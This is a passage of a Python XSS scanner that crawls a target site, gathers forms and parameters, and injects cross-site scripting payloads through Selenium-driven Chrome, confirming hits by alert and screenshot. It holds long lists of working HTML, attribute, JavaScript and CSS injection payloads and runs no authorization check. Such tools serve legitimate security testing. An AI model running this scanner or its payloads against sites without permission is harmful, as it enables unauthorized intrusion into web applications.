#!/usr/bin/env python3
"""
Advanced XSS Scanner with Chrome-based testing and improved alert handling
Focused on XSS-specific reconnaissance and real browser testing
"""

import requests
import time
import random
import string
import os
import re
import json
import logging
import urllib.parse
import base64
import hashlib
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from urllib.parse import urljoin, urlparse, parse_qs
from dataclasses import dataclass, asdict
from typing import List, Dict, Set
from datetime import datetime
from bs4 import BeautifulSoup

# Selenium imports
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.common.by import By
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.common.exceptions import NoAlertPresentException, TimeoutException
    from selenium.webdriver.chrome.service import Service
    from webdriver_manager.chrome import ChromeDriverManager
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False
    print("Selenium not available. Install with: pip install selenium webdriver-manager")

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class Colors:
    """Color codes for terminal output"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    END = '\033[0m'
    BOLD = '\033[1m'

@dataclass
class XSSPoint:
    """Data class for XSS testing points"""
    url: str
    parameter: str
    form_data: Dict = None
    method: str = 'GET'
    context: str = 'html'

@dataclass
class XSSVulnerability:
    """Data class for confirmed XSS vulnerabilities"""
    url: str
    parameter: str
    payload: str
    context: str
    test_url: str
    alert_text: str = None
    screenshot_path: str = None

class AdvancedReconnaissance:
    """Advanced reconnaissance module with deep parameter discovery"""
    
    def __init__(self, target_url, max_depth=3, max_threads=20):
        self.target_url = target_url
        self.max_depth = max_depth
        self.max_threads = max_threads
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        
        # Configure connection pool
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=50,
            pool_maxsize=50,
            max_retries=3
        )
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
        self.visited_urls = set()
        self.discovered_urls = set()
        self.forms = []
        self.parameters = set()
        self.xss_points = []
        self.technologies = set()
        self.js_files = []
        self.api_endpoints = []
        self.parameter_patterns = [
            r'(\w+)=([^&\s]+)',
            r'name=["\'](\w+)["\']',
            r'id=["\'](\w+)["\']',
            r'class=["\']([^"\']*(\w+)[^"\']*)["\']',
            r'data-(\w+)=',
            r'ng-(\w+)=',
            r'v-(\w+)=',
            r'@(\w+)=',
            r'#(\w+)',
            r'\$(\w+)',
        ]

    def run_reconnaissance(self):
        """Run complete reconnaissance"""
        logger.info(f"{Colors.BLUE}[RECON] Starting deep reconnaissance...{Colors.END}")
        
        # Phase 1: Deep crawling and discovery
        self.deep_crawling()
        
        # Phase 2: Parameter discovery
        self.discover_parameters()
        
        # Phase 3: Technology detection
        self.detect_technologies()
        
        # Phase 4: JavaScript analysis (enhanced)
        self.analyze_javascript()
        
        # Phase 5: API endpoints discovery
        self.discover_api_endpoints()
        
        # Phase 6: XSS points analysis
        self.analyze_xss_points()
        
        logger.info(f"{Colors.GREEN}[RECON] Reconnaissance completed: {len(self.discovered_urls)} URLs, {len(self.forms)} forms, {len(self.parameters)} parameters{Colors.END}")
        
        return {
            'urls': list(self.discovered_urls),
            'forms': self.forms,
            'parameters': list(self.parameters),
            'xss_points': [asdict(point) for point in self.xss_points],
            'technologies': list(self.technologies),
            'js_files': self.js_files,
            'api_endpoints': self.api_endpoints
        }

    def deep_crawling(self):
        """Enhanced deep crawling with parallel processing"""
        logger.info(f"{Colors.BLUE}[RECON] Starting deep crawling...{Colors.END}")
        
        current_urls = {self.target_url}
        self.discovered_urls.add(self.target_url)
        
        for depth in range(self.max_depth):
            logger.info(f"{Colors.CYAN}[CRAWL] Depth {depth + 1} - {len(current_urls)} URLs{Colors.END}")
            
            if not current_urls:
                break
                
            # Parallel URL processing
            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                futures = [executor.submit(self.crawl_url_advanced, url) for url in current_urls]
                new_urls = set()
                
                for future in futures:
                    try:
                        urls = future.result()
                        new_urls.update(urls)
                    except Exception as e:
                        logger.error(f"{Colors.RED}[CRAWL] Error in parallel crawling: {e}{Colors.END}")
                
            # Filter new URLs
            current_urls = new_urls - self.discovered_urls
            self.discovered_urls.update(current_urls)

    def crawl_url_advanced(self, url):
        """Advanced URL crawling with form discovery"""
        if url in self.visited_urls:
            return set()
            
        self.visited_urls.add(url)
        found_urls = set()
        
        try:
            response = self.session.get(url, timeout=15, allow_redirects=True)
            soup = BeautifulSoup(response.content, 'html.parser')
            
            # Extract links
            for link in soup.find_all('a', href=True):
                full_url = urljoin(url, link['href'])
                if self.is_same_domain(full_url):
                    found_urls.add(full_url)
            
            # Extract forms
            for form in soup.find_all('form'):
                form_data = self.extract_form_data(form, url)
                if form_data:
                    self.forms.append(form_data)
            
            # Extract parameters from page content
            self.extract_parameters_from_content(response.text)
            
            # Detect technologies
            self.detect_technologies_from_response(response)
            
        except Exception as e:
            logger.error(f"{Colors.RED}[CRAWL] Error processing {url}: {e}{Colors.END}")
            
        return found_urls

    def extract_form_data(self, form, base_url):
        """Extract comprehensive form data"""
        action = form.get('action', '')
        method = form.get('method', 'GET').upper()
        
        if action:
            action_url = urljoin(base_url, action)
        else:
            action_url = base_url
            
        inputs = []
        for input_tag in form.find_all(['input', 'textarea', 'select']):
            input_data = {
                'name': input_tag.get('name', ''),
                'type': input_tag.get('type', 'text'),
                'value': input_tag.get('value', ''),
                'required': input_tag.get('required') is not None
            }
            if input_data['name']:
                inputs.append(input_data)
                self.parameters.add(input_data['name'])
        
        if inputs:
            return {
                'url': action_url,
                'method': method,
                'inputs': inputs,
                'raw_form': str(form)
            }
        return None

    def discover_parameters(self):
        """Enhanced parameter discovery from multiple sources"""
        logger.info(f"{Colors.BLUE}[RECON] Discovering parameters...{Colors.END}")
        
        # Common parameter wordlist
        common_params = [
            'q', 'query', 'search', 'keyword', 'term', 'name', 'user', 'username', 'email',
            'password', 'pass', 'login', 'id', 'uid', 'token', 'csrf', 'callback', 'redirect',
            'url', 'link', 'src', 'file', 'path', 'data', 'content', 'message', 'comment',
            'text', 'description', 'title', 'subject', 'body', 'input', 'value', 'param',
            'arg', 'var', 'field', 'key', 'code', 'ref', 'page', 'action', 'cmd', 'exec',
            'debug', 'test', 'admin', 'config', 'setting', 'option', 'filter', 'sort',
            'order', 'limit', 'offset', 'start', 'end', 'from', 'to', 'min', 'max',
            'searchFor', 'searchTerm', 'searchQuery', 'searchKeyword'
        ]
        
        # Add common parameters
        self.parameters.update(common_params)
        
        # Discover from URLs
        for url in self.discovered_urls:
            parsed_url = urlparse(url)
            if parsed_url.query:
                query_params = parse_qs(parsed_url.query)
                self.parameters.update(query_params.keys())
        
        logger.info(f"{Colors.GREEN}[RECON] Discovered {len(self.parameters)} parameters{Colors.END}")

    def extract_parameters_from_content(self, content):
        """Extract parameters from page content using regex patterns"""
        for pattern in self.parameter_patterns:
            matches = re.findall(pattern, content)
            if matches:
                if isinstance(matches[0], tuple):
                    self.parameters.update([match[0] for match in matches])
                else:
                    self.parameters.update(matches)

    def detect_technologies(self):
        """Enhanced technology detection"""
        logger.info(f"{Colors.BLUE}[RECON] Detecting technologies...{Colors.END}")
        
        for url in list(self.discovered_urls)[:10]:  # Sample first 10 URLs
            try:
                response = self.session.get(url, timeout=10)
                self.detect_technologies_from_response(response)
            except Exception as e:
                continue
                
        logger.info(f"{Colors.GREEN}[RECON] Detected technologies: {', '.join(self.technologies)}{Colors.END}")

    def detect_technologies_from_response(self, response):
        """Detect technologies from HTTP response"""
        # Check headers
        headers = response.headers
        
        # Server header
        server = headers.get('Server', '')
        if server:
            self.technologies.add(server)
            
        # X-Powered-By
        powered_by = headers.get('X-Powered-By', '')
        if powered_by:
            self.technologies.add(powered_by)
            
        # Content analysis
        content = response.text.lower()
        
        # Framework detection
        if 'wordpress' in content:
            self.technologies.add('WordPress')
        if 'drupal' in content:
            self.technologies.add('Drupal')
        if 'joomla' in content:
            self.technologies.add('Joomla')
        if 'django' in content:
            self.technologies.add('Django')
        if 'flask' in content:
            self.technologies.add('Flask')
        if 'laravel' in content:
            self.technologies.add('Laravel')
        if 'react' in content:
            self.technologies.add('React')
        if 'vue' in content:
            self.technologies.add('Vue.js')
        if 'angular' in content:
            self.technologies.add('Angular')

    def analyze_javascript(self):
        """Enhanced JavaScript file analysis"""
        logger.info(f"{Colors.BLUE}[RECON] Analyzing JavaScript files...{Colors.END}")
        
        js_patterns = [
            r'\.js["\']',
            r'src=["\']([^"\']*\.js[^"\']*)["\']',
            r'<script[^>]*src=["\']([^"\']*)["\']'
        ]
        
        # Find JS files from discovered pages
        for url in list(self.discovered_urls)[:20]:  # Analyze more pages
            try:
                response = self.session.get(url, timeout=10)
                soup = BeautifulSoup(response.content, 'html.parser')
                
                # Find script tags with src
                for script in soup.find_all('script', src=True):
                    js_url = urljoin(url, script['src'])
                    if js_url not in self.js_files:
                        self.js_files.append(js_url)
                        
            except Exception as e:
                continue
        
        # Analyze JS files for parameters and endpoints
        for js_url in self.js_files[:50]:  # Increase limit
            try:
                response = self.session.get(js_url, timeout=10)
                js_content = response.text
                
                # Extract parameters from JS
                js_param_patterns = [
                    r'["\'](\w+)["\']:\s*["\']?[^,}\]]+["\']?',
                    r'\.(\w+)\s*=',
                    r'["\'](\w+)["\']',
                    r'data\[[\'"]*(\w+)[\'"]*\]',
                    r'params\.(\w+)',
                    r'query\.(\w+)',
                    r'request\.(\w+)',
                    r'form\.(\w+)',
                    r'input\.(\w+)',
                    r'url\s*\+\s*["\'][\?&](\w+)=',
                    r'["\'][\?&](\w+)=["\']',
                ]
                
                for pattern in js_param_patterns:
                    matches = re.findall(pattern, js_content)
                    self.parameters.update(matches)
                
                # Extract API endpoints
                api_patterns = [
                    r'["\']([^"\']*\/api\/[^"\']*)["\']',
                    r'["\']([^"\']*\/v\d+\/[^"\']*)["\']',
                    r'["\']([^"\']*\.(json|xml|api)[^"\']*)["\']',
                ]
                
                for pattern in api_patterns:
                    matches = re.findall(pattern, js_content)
                    for match in matches:
                        if isinstance(match, tuple):
                            endpoint = match[0]
                        else:
                            endpoint = match
                        full_endpoint = urljoin(self.target_url, endpoint)
                        if full_endpoint not in self.api_endpoints:
                            self.api_endpoints.append(full_endpoint)
                
            except Exception as e:
                continue
                
        logger.info(f"{Colors.GREEN}[RECON] Analyzed {len(self.js_files)} JavaScript files{Colors.END}")

    def discover_api_endpoints(self):
        """Discover API endpoints"""
        logger.info(f"{Colors.BLUE}[RECON] Discovering API endpoints...{Colors.END}")
        
        # Common API paths
        api_paths = [
            '/api/', '/api/v1/', '/api/v2/', '/api/v3/',
            '/rest/', '/graphql/', '/json/', '/xml/',
            '/services/', '/webservice/', '/ws/',
            '/ajax/', '/async/', '/data/'
        ]
        
        # Test common API endpoints
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for path in api_paths:
                test_url = urljoin(self.target_url, path)
                futures.append(executor.submit(self.test_api_endpoint, test_url))
            
            for future in futures:
                try:
                    result = future.result()
                    if result:
                        self.api_endpoints.append(result)
                except Exception as e:
                    continue
        
        logger.info(f"{Colors.GREEN}[RECON] Found {len(self.api_endpoints)} API endpoints{Colors.END}")

    def test_api_endpoint(self, url):
        """Test if URL is a valid API endpoint"""
        try:
            response = self.session.get(url, timeout=5)
            if response.status_code == 200:
                content_type = response.headers.get('Content-Type', '').lower()
                if 'json' in content_type or 'xml' in content_type:
                    return url
        except Exception:
            pass
        return None

    def analyze_xss_points(self):
        """Analyze and create XSS testing points"""
        logger.info(f"{Colors.BLUE}[RECON] Analyzing XSS points...{Colors.END}")
        
        # Form-based XSS points
        for form in self.forms:
            for input_field in form['inputs']:
                if input_field['type'] not in ['hidden', 'submit', 'button']:
                    xss_point = XSSPoint(
                        url=form['url'],
                        parameter=input_field['name'],
                        form_data=form,
                        method=form['method'],
                        context=self.detect_form_context(form, input_field)
                    )
                    self.xss_points.append(xss_point)
        
        # URL parameter-based XSS points
        for url in self.discovered_urls:
            parsed_url = urlparse(url)
            if parsed_url.query:
                query_params = parse_qs(parsed_url.query)
                for param in query_params.keys():
                    xss_point = XSSPoint(
                        url=url,
                        parameter=param,
                        method='GET',
                        context=self.detect_url_context(url, param)
                    )
                    self.xss_points.append(xss_point)
        
        logger.info(f"{Colors.GREEN}[RECON] Found {len(self.xss_points)} XSS testing points{Colors.END}")

    def detect_form_context(self, form, input_field):
        """Detect XSS context for form inputs"""
        input_type = input_field.get('type', '').lower()
        input_name = input_field.get('name', '').lower()
        
        if input_type in ['email', 'url']:
            return 'url'
        elif 'password' in input_name:
            return 'html'
        elif 'search' in input_name or 'query' in input_name:
            return 'html'
        else:
            return 'html'

    def detect_url_context(self, url, parameter):
        """Detect XSS context for URL parameters"""
        contexts = []
        
        if 'callback' in parameter.lower():
            contexts.append('javascript')
        if 'redirect' in parameter.lower() or 'url' in parameter.lower():
            contexts.append('url')
        if parameter in url:
            contexts.append('url')
        
        return contexts[0] if contexts else 'html'  # Return first context or default to HTML

    def is_same_domain(self, url):
        """Check if URL is from the same domain"""
        try:
            target_domain = urlparse(self.target_url).netloc
            url_domain = urlparse(url).netloc
            return target_domain == url_domain
        except:
            return False

class AdvancedXSSScanner:
    """Advanced XSS scanner with Chrome-based testing and improved alert detection"""
    
    def __init__(self, recon_data):
        self.recon_data = recon_data
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        self.vulnerabilities = []
        self.driver = None
        self.unique_alert_id = f"XSS_SCANNER_{random.randint(10000, 99999)}"
        self.setup_selenium()

    def setup_selenium(self):
        """Setup Selenium WebDriver with improved configuration and fallback options"""
        if not SELENIUM_AVAILABLE:
            logger.warning(f"{Colors.YELLOW}[SELENIUM] Selenium not available{Colors.END}")
            return
            
        try:
            chrome_options = Options()
            # Disable unnecessary features for performance
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--disable-extensions')
            chrome_options.add_argument('--disable-plugins')
            chrome_options.add_argument('--disable-images')
            chrome_options.add_argument('--disable-javascript-harmony-shipping')
            chrome_options.add_argument('--disable-javascript-harmony')
            chrome_options.add_argument('--disable-background-networking')
            chrome_options.add_argument('--disable-background-timer-throttling')
            chrome_options.add_argument('--disable-renderer-backgrounding')
            chrome_options.add_argument('--disable-backgrounding-occluded-windows')
            chrome_options.add_argument('--disable-client-side-phishing-detection')
            chrome_options.add_argument('--disable-sync')
            chrome_options.add_argument('--disable-translate')
            chrome_options.add_argument('--hide-scrollbars')
            chrome_options.add_argument('--mute-audio')
            chrome_options.add_argument('--no-first-run')
            chrome_options.add_argument('--safebrowsing-disable-auto-update')
            chrome_options.add_argument('--ignore-certificate-errors')
            chrome_options.add_argument('--ignore-ssl-errors')
            chrome_options.add_argument('--ignore-certificate-errors-spki-list')
            chrome_options.add_argument('--ignore-certificate-errors-skip-list')
            chrome_options.add_argument('--disable-blink-features=AutomationControlled')
            chrome_options.add_argument('--disable-web-security')
            chrome_options.add_argument('--allow-running-insecure-content')
            chrome_options.add_argument('--disable-features=VizDisplayCompositor')
            
            # Set window size
            chrome_options.add_argument('--window-size=1920,1080')
            
            # Try multiple approaches to initialize WebDriver
            driver_initialized = False
            
            # Method 1: Try with ChromeDriverManager
            try:
                service = Service(ChromeDriverManager().install())
                self.driver = webdriver.Chrome(service=service, options=chrome_options)
                self.driver.set_page_load_timeout(30)
                driver_initialized = True
                logger.info(f"{Colors.GREEN}[SELENIUM] WebDriver initialized successfully with ChromeDriverManager{Colors.END}")
            except Exception as e1:
                logger.warning(f"{Colors.YELLOW}[SELENIUM] ChromeDriverManager failed: {e1}{Colors.END}")
                
                # Method 2: Try without service (use system ChromeDriver)
                try:
                    self.driver = webdriver.Chrome(options=chrome_options)
                    self.driver.set_page_load_timeout(30)
                    driver_initialized = True
                    logger.info(f"{Colors.GREEN}[SELENIUM] WebDriver initialized successfully with system ChromeDriver{Colors.END}")
                except Exception as e2:
                    logger.warning(f"{Colors.YELLOW}[SELENIUM] System ChromeDriver failed: {e2}{Colors.END}")
                    
                    # Method 3: Try with headless mode
                    try:
                        chrome_options.add_argument('--headless')
                        self.driver = webdriver.Chrome(options=chrome_options)
                        self.driver.set_page_load_timeout(30)
                        driver_initialized = True
                        logger.info(f"{Colors.GREEN}[SELENIUM] WebDriver initialized successfully in headless mode{Colors.END}")
                    except Exception as e3:
                        logger.error(f"{Colors.RED}[SELENIUM] All WebDriver initialization methods failed: {e3}{Colors.END}")
            
            if not driver_initialized:
                self.driver = None
                logger.error(f"{Colors.RED}[SELENIUM] Failed to initialize WebDriver. Chrome-based testing will be skipped.{Colors.END}")
                logger.info(f"{Colors.YELLOW}[SELENIUM] Please ensure Chrome browser and ChromeDriver are properly installed{Colors.END}")
            
        except Exception as e:
            logger.error(f"{Colors.RED}[SELENIUM] Failed to initialize WebDriver: {e}{Colors.END}")
            self.driver = None

    def scan_xss_vulnerabilities(self):
        """Scan for XSS vulnerabilities using Chrome"""
        logger.info(f"{Colors.BLUE}[XSS] Starting Chrome-based XSS scanning...{Colors.END}")
        
        # Get XSS points from reconnaissance
        xss_points = [XSSPoint(**point) for point in self.recon_data['xss_points']]
        
        # Separate forms and URL parameters
        form_points = [point for point in xss_points if point.method == 'POST']
        url_points = [point for point in xss_points if point.method == 'GET']
        
        # Scan forms
        if form_points:
            logger.info(f"{Colors.BLUE}[XSS] Scanning {len(form_points)} forms...{Colors.END}")
            self.scan_forms(form_points)
        
        # Scan URL parameters
        if url_points:
            logger.info(f"{Colors.BLUE}[XSS] Scanning {len(url_points)} URLs...{Colors.END}")
            self.scan_urls(url_points)
        
        return self.vulnerabilities

    def scan_forms(self, form_points):
        """Scan form-based XSS with improved alert handling"""
        for point in form_points:
            logger.info(f"{Colors.CYAN}[FORM] Testing form: {point.url}{Colors.END}")
            
            # Get context-specific payloads
            payloads = self.generate_payloads_for_context(point.context)
            
            for payload in payloads[:10]:  # Test top 10 payloads per form
                logger.info(f"{Colors.YELLOW}[XSS] Testing payload: {payload[:50]}...{Colors.END}")
                
                # Test with improved Chrome method
                is_vulnerable, test_url, alert_text, screenshot_path = self.test_xss_with_chrome_improved(
                    point.url, point.parameter, payload, point.context, 'POST'
                )
                
                if is_vulnerable:
                    vulnerability = XSSVulnerability(
                        url=point.url,
                        parameter=point.parameter,
                        payload=payload,
                        context=point.context,
                        test_url=test_url,
                        alert_text=alert_text,
                        screenshot_path=screenshot_path
                    )
                    self.vulnerabilities.append(vulnerability)
                    
                    logger.info(f"{Colors.GREEN}[VULN] XSS CONFIRMED in {point.url} parameter: {point.parameter}{Colors.END}")
                    logger.info(f"{Colors.GREEN}[PAYLOAD] {payload}{Colors.END}")
                    logger.info(f"{Colors.GREEN}[CONTEXT] {point.context}{Colors.END}")
                    logger.info(f"{Colors.GREEN}[TEST_URL] {test_url}{Colors.END}")
                    logger.info(f"{Colors.GREEN}[ALERT] {alert_text}{Colors.END}")
                    
                    break  # Move to next form after finding vulnerability

    def scan_urls(self, url_points):
        """Scan URL parameter-based XSS with improved alert handling"""
        for point in url_points:
            logger.info(f"{Colors.CYAN}[URL] Testing URL: {point.url}{Colors.END}")
            
            # Get context-specific payloads
            payloads = self.generate_payloads_for_context(point.context)
            
            for payload in payloads[:10]:  # Test top 10 payloads per parameter
                logger.info(f"{Colors.YELLOW}[XSS] Testing payload: {payload[:50]}...{Colors.END}")
                
                # Test with improved Chrome method
                is_vulnerable, test_url, alert_text, screenshot_path = self.test_xss_with_chrome_improved(
                    point.url, point.parameter, payload, point.context, 'GET'
                )
                
                if is_vulnerable:
                    vulnerability = XSSVulnerability(
                        url=point.url,
                        parameter=point.parameter,
                        payload=payload,
                        context=point.context,
                        test_url=test_url,
                        alert_text=alert_text,
                        screenshot_path=screenshot_path
                    )
                    self.vulnerabilities.append(vulnerability)
                    
                    logger.info(f"{Colors.GREEN}[VULN] XSS CONFIRMED in {point.url} parameter: {point.parameter}{Colors.END}")
                    logger.info(f"{Colors.GREEN}[PAYLOAD] {payload}{Colors.END}")
                    logger.info(f"{Colors.GREEN}[CONTEXT] {point.context}{Colors.END}")
                    logger.info(f"{Colors.GREEN}[TEST_URL] {test_url}{Colors.END}")
                    logger.info(f"{Colors.GREEN}[ALERT] {alert_text}{Colors.END}")
                    
                    break  # Move to next URL after finding vulnerability

    def test_xss_with_chrome_improved(self, url, parameter, payload, context, method='GET'):
        """Improved XSS testing with better alert handling and screenshot capture"""
        if not self.driver:
            logger.warning(f"{Colors.YELLOW}[XSS] Chrome not available, using fallback method{Colors.END}")
            return self.test_xss_fallback(url, parameter, payload, context, method)
        
        try:
            # Create unique payload with our identifier
            unique_payload = payload.replace('alert("XSS")', f'alert("{self.unique_alert_id}")')
            unique_payload = unique_payload.replace("alert('XSS')", f"alert('{self.unique_alert_id}')")
            
            # Prepare the test URL or data
            if method == 'GET':
                # For GET requests, modify the URL
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                query_params[parameter] = [unique_payload]
                
                # Rebuild URL
                new_query = urllib.parse.urlencode(query_params, doseq=True)
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                
                logger.info(f"{Colors.CYAN}[XSS] Testing GET: {test_url}{Colors.END}")
                
                # Navigate to the URL
                self.driver.get(test_url)
                
            else:
                # For POST requests, navigate to form page first
                self.driver.get(url)
                time.sleep(2)
                
                # Find the form and fill it
                forms = self.driver.find_elements(By.TAG_NAME, "form")
                if forms:
                    form = forms[0]
                    
                    # Find input field
                    try:
                        input_field = form.find_element(By.NAME, parameter)
                        input_field.clear()
                        input_field.send_keys(unique_payload)
                        
                        # Submit form
                        form.submit()
                        time.sleep(2)  # Wait for form submission
                    except Exception as e:
                        logger.error(f"{Colors.RED}[XSS] Error filling form: {e}{Colors.END}")
                        return False, None, None, None
                
                test_url = self.driver.current_url
            
            # Wait for page to load and potential alert
            time.sleep(5)  # Increased wait time for better alert detection
            
            # Improved alert detection with multiple attempts
            alert_detected = False
            alert_text = None
            screenshot_path = None
            
            # Try to detect alert multiple times with different approaches
            for attempt in range(3):
                try:
                    # Check if alert is present
                    alert = self.driver.switch_to.alert
                    alert_text = alert.text
                    
                    # Check if it's our unique alert
                    if self.unique_alert_id in alert_text:
                        # Take screenshot BEFORE dismissing alert
                        screenshot_path = self.capture_screenshot_improved(test_url, parameter, payload)
                        alert.accept()  # Close the alert
                        logger.info(f"{Colors.GREEN}[XSS] SUCCESS! Our unique alert detected: {alert_text}{Colors.END}")
                        return True, test_url, alert_text, screenshot_path
                    else:
                        # It's not our alert, dismiss it and continue
                        alert.accept()
                        logger.info(f"{Colors.YELLOW}[XSS] Alert detected but not ours: {alert_text}{Colors.END}")
                        break
                    
                except NoAlertPresentException:
                    # No alert found, wait a bit and try again
                    if attempt < 2:
                        time.sleep(1)
                        continue
                    else:
                        # No alert after all attempts, check if payload is reflected
                        page_source = self.driver.page_source
                        if unique_payload in page_source:
                            # Check if it's in executable context
                            if self.check_executable_context(page_source, unique_payload, context):
                                # Take screenshot for reflected payload
                                screenshot_path = self.capture_screenshot_improved(test_url, parameter, payload)
                                logger.info(f"{Colors.GREEN}[XSS] SUCCESS! Payload reflected in executable context{Colors.END}")
                                return True, test_url, "Reflected in context", screenshot_path
                        break
                
                except Exception as e:
                    logger.error(f"{Colors.RED}[XSS] Alert handling error (attempt {attempt + 1}): {e}{Colors.END}")
                    if attempt < 2:
                        time.sleep(1)
                        continue
                    else:
                        break
            
            return False, test_url, None, None
            
        except Exception as e:
            logger.error(f"{Colors.RED}[XSS] Error testing with Chrome: {str(e)}{Colors.END}")
            return False, None, None, None

    def test_xss_fallback(self, url, parameter, payload, context, method='GET'):
        """Fallback XSS testing method when Chrome is not available"""
        try:
            # Create unique payload with our identifier
            unique_payload = payload.replace('alert("XSS")', f'alert("{self.unique_alert_id}")')
            unique_payload = unique_payload.replace("alert('XSS')", f"alert('{self.unique_alert_id}')")
            
            # Prepare the test URL or data
            if method == 'GET':
                # For GET requests, modify the URL
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                query_params[parameter] = [unique_payload]
                
                # Rebuild URL
                new_query = urllib.parse.urlencode(query_params, doseq=True)
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                
                logger.info(f"{Colors.CYAN}[XSS] Testing GET (fallback): {test_url}{Colors.END}")
                
                # Send request
                response = self.session.get(test_url, timeout=10)
                
            else:
                # For POST requests
                test_url = url
                logger.info(f"{Colors.CYAN}[XSS] Testing POST (fallback): {test_url}{Colors.END}")
                
                # Send POST request
                response = self.session.post(test_url, data={parameter: unique_payload}, timeout=10)
            
            # Check if payload is reflected
            if unique_payload in response.text:
                # Check if it's in executable context
                if self.check_executable_context(response.text, unique_payload, context):
                    logger.info(f"{Colors.GREEN}[XSS] SUCCESS! Payload reflected in executable context (fallback){Colors.END}")
                    return True, test_url, "Reflected in context (fallback)", None
            
            return False, test_url, None, None
            
        except Exception as e:
            logger.error(f"{Colors.RED}[XSS] Error in fallback testing: {str(e)}{Colors.END}")
            return False, None, None, None

    def capture_screenshot_improved(self, test_url, parameter, payload):
        """Improved screenshot capture with better error handling"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            hash_suffix = hashlib.md5(f"{test_url}{parameter}".encode()).hexdigest()[:8]
            filename = f"xss_poc_{timestamp}_{hash_suffix}.png"
            
            # Ensure screenshots directory exists
            os.makedirs("screenshots", exist_ok=True)
            filepath = os.path.join("screenshots", filename)
            
            # Take screenshot
            self.driver.save_screenshot(filepath)
            
            logger.info(f"{Colors.GREEN}[SCREENSHOT] PoC saved: {filename}{Colors.END}")
            return filepath
            
        except Exception as e:
            logger.error(f"{Colors.RED}[SCREENSHOT] Failed to capture: {e}{Colors.END}")
            return None

    def check_executable_context(self, page_source, payload, context):
        """Check if payload is in executable context"""
        soup = BeautifulSoup(page_source, 'html.parser')
        
        if context == 'html':
            # Check for script tags or event handlers
            return '<script>' in payload or 'on' in payload or '<img' in payload
        elif context == 'attribute':
            # Check for attribute injection
            return 'on' in payload or 'javascript:' in payload
        elif context == 'javascript':
            # Check for JavaScript context
            return 'alert' in payload or 'eval' in payload
        elif context == 'url':
            # Check for URL context
            return 'javascript:' in payload or 'data:' in payload
        
        return True  # Default to True for unknown contexts

    def generate_payloads_for_context(self, context):
        """Generate XSS payloads specific to the detected context"""
        payloads = {
            'html': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '<iframe src="javascript:alert(\'XSS\')">',
                '<object data="javascript:alert(\'XSS\')">',
                '<embed src="javascript:alert(\'XSS\')">',
                '<form><button formaction="javascript:alert(\'XSS\')">',
                '<details open ontoggle="alert(\'XSS\')">',
                '<marquee onstart="alert(\'XSS\')">',
                '<video><source onerror="alert(\'XSS\')">',
                '<audio src=x onerror=alert("XSS")>',
                '<body onload=alert("XSS")>',
                '<input onfocus=alert("XSS") autofocus>',
                '<select onfocus=alert("XSS") autofocus>',
                '<textarea onfocus=alert("XSS") autofocus>',
                '<keygen onfocus=alert("XSS") autofocus>',
                '<iframe src="data:text/html,<script>alert(\'XSS\')</script>">',
                '<object data="data:text/html,<script>alert(\'XSS\')</script>">',
                '<embed src="data:text/html,<script>alert(\'XSS\')</script>">'
            ],
            'attribute': [
                '" onmouseover="alert(\'XSS\')"',
                '" onfocus="alert(\'XSS\')" autofocus="',
                '" onload="alert(\'XSS\')"',
                '" onerror="alert(\'XSS\')"',
                '" onclick="alert(\'XSS\')"',
                '" onblur="alert(\'XSS\')"',
                '" onchange="alert(\'XSS\')"',
                '" onsubmit="alert(\'XSS\')"',
                '" onreset="alert(\'XSS\')"',
                '" onselect="alert(\'XSS\')"',
                '" onkeydown="alert(\'XSS\')"',
                '" onkeyup="alert(\'XSS\')"',
                '" onkeypress="alert(\'XSS\')"',
                '" onmousedown="alert(\'XSS\')"',
                '" onmouseup="alert(\'XSS\')"',
                '" onmousemove="alert(\'XSS\')"',
                '" onmouseout="alert(\'XSS\')"',
                '" onmouseenter="alert(\'XSS\')"',
                '" onmouseleave="alert(\'XSS\')"',
                '" ondblclick="alert(\'XSS\')"'
            ],
            'javascript': [
                ';alert("XSS");',
                '";alert("XSS");//',
                "';alert('XSS');//",
                '`;alert("XSS");//',
                '\\";alert("XSS");//',
                "\\';alert('XSS');//",
                '\\`;alert("XSS");//',
                '}alert("XSS");{',
                ']alert("XSS");[',
                ')alert("XSS");(',
                '=alert("XSS");',
                '+alert("XSS");',
                '-alert("XSS");',
                '*alert("XSS");',
                '/alert("XSS");',
                '%alert("XSS");',
                '&alert("XSS");',
                '|alert("XSS");',
                '^alert("XSS");',
                '~alert("XSS");'
            ],
            'css': [
                'expression(alert("XSS"))',
                'url("javascript:alert(\'XSS\')")',
                'url("data:text/html,<script>alert(\'XSS\')</script>")',
                'url("vbscript:alert(\'XSS\')")',
                'url("onload=alert(\'XSS\')")',
                'url("onerror=alert(\'XSS\')")',
                'url("onclick=alert(\'XSS\')")',
